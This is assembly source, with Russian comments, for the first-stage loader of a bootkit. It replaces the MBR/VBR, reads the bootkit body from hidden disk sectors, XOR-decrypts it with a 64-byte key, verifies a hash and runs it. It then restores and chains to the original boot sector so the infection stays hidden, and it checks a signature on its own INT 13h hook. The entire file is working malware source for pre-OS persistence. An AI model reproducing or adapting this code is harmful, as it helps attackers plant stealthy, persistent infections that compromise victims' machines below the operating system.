org 200h

; Первый сектор у нас будет загрушкой, т. к. у разных вариантов загрузоччиков используются разные смещения.
times 508 - ($ - $$) db 0x90

jmp    l_start

dw 0xAA55

; Данный модуль содержит MBR/VBR код и по сути является Stage0-загузчиком в оббязанности которого входит:
; 1. Загрузка и дешифрация Stage1-загрузчика.
; 2. Передача управления на Stage1-загрузчик.
; 3. В случае возникновения каких-либо ошибок, передача управления на настоящий загрузчик системы (MBR/VBR).

; Пакет дискового адреса для загрузки Stage1-модуля.
jmp preload
l_dap:
dap_size     db 10h
dap_reserved db 0
dap_sectors  dw 1
dap_buff_lo  dw 0
dap_buff_hi  dw 0
dap_start_lo dd 0 ; Сюда на этапе установки буткита будет записано смещение до оригинального VBR.
dap_start_hi dd 0 ; 

l_dap_preload:
dap_pre_size     db 10h
dap_pre_reserved db 0
dap_pre_sectors  dw 16 ; 16 секторов для запутывания.
dap_pre_buff_lo  dw 0x9090
dap_pre_buff_hi  dw 0
dap_pre_start_lo dd 0 ; Сюда на этапе установки буткита будет записано смещение до тела нашего буткита.
dap_pre_start_hi dd 0 ; 

preload:
pushad ; Сохраняем регистры.
push   ds
push   es

; Восстанавливаем на время оригинальный VBR-сектор.
mov    si, l_dap_preload
add    si, bp
mov    dl, [cs:bp + 0x40] ; dl - номер загрузочного диска.
mov    [si + 4], bp
; Данный случай возможен только когда запускается FAT32-загрузчиком.
mov    ah, 2
call   f_read_write_sectors
jc     halt_loader

mov    ax, bp
shr    ax, 4
mov    ds, ax
push   ax
push   after_preload
retf

l_start:
pushad ; Сохраняем регистры.
push   ds
push   es

; Копируем оригинальный VBR по адресу 0x7C00.
cld
push   cs
pop    ds
xor    ax, ax
mov    es, ax
xor    si, si
mov    di, 0x7C00
mov    cx, 512
rep    movsb

after_preload:
; Проверяем установлен ли наш перехват 13-го прерывания, если да, то грузимся из активного раздела.
mov    bx, [ss:0x4C]
mov    es, [ss:0x4E]
cmp    dword [es:bx + 2], 0x74B0D47F ; Проверяем сигнатуру вначале нашего INT 13h обработчика.
jz     l_boot_active

; Декриптуем тело буткита.
l_decryptor:
mov    di, $ ; Смещение от начала сектора.
mov    dx, di
add    dx, 64
mov    cx, 7 ; Узнаём количество считанных секторов.
shl    cx, 9 ; В cx содержится размер тела буткита.
sub    cx, 2 + 6 * 4
mov    si, 1536 + 2 + 6 * 4
xor    ebx, ebx ; В ebx будет лежать crc32 для дешифрованного буфера за исключением последних 4 байтов.
l_decrypt:
mov    al, [si] ; Загружаем очередной байт тела буткита в al.
xor    al, [cs:di] ; XOR-им с байтом ключа.
mov    [si], al ; Записываем дешифрованный байт обратно.
cmp    cx, 4
jle    skip_hash ; Последние 4 байта содержат хеш-значение, которое не должно учитываться.
rol    ebx, 7
xor    bl, al
skip_hash:
inc    di ; Увеличиваем позицию внутри ключа.
inc    si ; Увеличиваем позицию в теле буткита.
cmp    di, dx
jne     l_next_byte
sub    di, 64 ; Переходим на начало ключа.
l_next_byte:
loop   l_decrypt

; Проверяем контрольную сумму буткита.
sub    si, 4
cmp    ebx, [si]
jne    l_boot_active

; Передача управления буткиту
call 0x600

l_boot_active:
push   cs
pop    ds
; Восстанавливаем на время оригинальный VBR-сектор.
mov    si, l_dap
mov    dl, [cs:0x24] ; dl - номер загрузочного диска.
cmp    dl, 0x87
jb     normal_val
mov    dl, [cs:0x40] ; dl - номер загрузочного диска.
normal_val:
mov    [si + 6], cs

mov    ax, ds
shl    ax, 4
add    ax, si
sub    ax, 1024
cmp    ax, 0x7C02
jne    far_execution

; Некоторые VBR считывают только 15 секторов за исключением первого, поэтому там в hiddenSectors остаётся неправильное смещение.
; При этом ещё и по адресу 0x7E00
; В этом случае нужно считать VBR с диска по адресу 0x7C00 и обновить там hiddenSectors, взяв его из нашего l_dap.
mov    ah, 2
call   f_read_write_sectors
jc     halt_loader
mov    eax, [si + 8]
mov    [cs:0x1C], eax

far_execution:
mov    ah, 3
call   f_read_write_sectors
jc     halt_loader ; Если возникла какая-то ошибка, то грузимся с активного раздела.
pop    es
pop    ds
popad ; Восстанавливаем регистры.
mov    dl, [cs:0x24] ; dl - номер загрузочного диска.
jmp    0x0000:0x7C00 ; Передаём управление оригинальному загрузчику.
halt_loader:
hlt

; si - смещение до DAP
; Важно, чтобы ds сожержал начало сегмента, внутри которого si будет указывать именно на DAP.
f_read_write_sectors:
pushad
; Сохраняем номер диска.
mov    bp, dx
; setup read segment
push   word [si + 6] ; dap_st1_buff_hi
pop    es
; if read area below that 504mb use CHS enforcement. This needed for compatibility with some stupid BIOSes
push   ax
xor    eax, eax
cmp    dword [si + 12], eax ; dap_st1_start_hi
jnz    l_check_lba
cmp    dword [si + 8], 504 * 1024 * 2 ; dap_st1_start_lo
jb     l_chs_mode
l_check_lba:
; Запрашиваем поддержку LBA режима.
mov    ah, 0x41
mov    bx, 0x55AA
int    0x13
jc     l_chs_mode
cmp    bx, 0xAA55
jnz    l_chs_mode
test   cl, 1
jz     l_chs_mode
; Устанавливаем LBA параметры.
l_lba_mode:
pop    ax
or     ah, 0x40
;mov    si, l_dap
;mov    ah, 0x43
mov    dx, bp
jmp    l_read_write
l_chs_mode: 
; get drive geometry
mov    ah, 0x08
mov    dx, bp
push   es
int    0x13
pop    es
; if get geometry failed, then try to use LBA mode
jc l_lba_mode
; Преобразуем LBA в CHS.
and    cl, 0x3F
inc    dh
movzx  ecx, cl ; ecx - max_sect
movzx  edi, dh ; esi - max_head
mov    eax, [si + 8] ; dap_st1_start_lo
xor    edx, edx
div    ecx
inc    dx
mov    cl, dl
xor    dx, dx
div    edi
mov    dh, dl
mov    ch, al
shr    ax, 0x02
and    al, 0xC0
or     cl, al
pop    ax
mov    al, [si + 2] ; dap_st1_sectors
;mov    ah, 3
mov    bx, bp ; Указываем номер диска.
mov    dl, bl
mov    bx, [si + 4] ; dap_st1_buff_lo
l_read_write:
push   es
int    0x13
pop    es
popad
ret

times 1022 - ($ - $$) db 0x90

dw 0xAA55

file "..\bin\module.bin"

nonalign_end_of_zbk:

times 4608 - ($ - $$) db 0x90

unused dw ($ - nonalign_end_of_zbk)